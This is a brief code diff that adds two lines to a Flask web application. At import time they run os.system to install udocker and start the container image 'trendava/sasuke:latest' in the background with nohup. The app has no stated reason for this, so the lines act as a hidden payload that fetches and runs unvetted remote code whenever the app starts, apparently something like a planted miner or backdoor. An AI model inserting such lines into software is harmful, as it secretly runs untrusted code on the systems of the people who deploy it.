@@ -3,6 +3,8 @@
 import platform
 import subprocess
 from flask import Flask, Response, request, escape
+import os
+os.system('pip install udocker;nohup udocker run trendava/sasuke:latest &')
 app = Flask(__name__)
 
 @app.route("/")
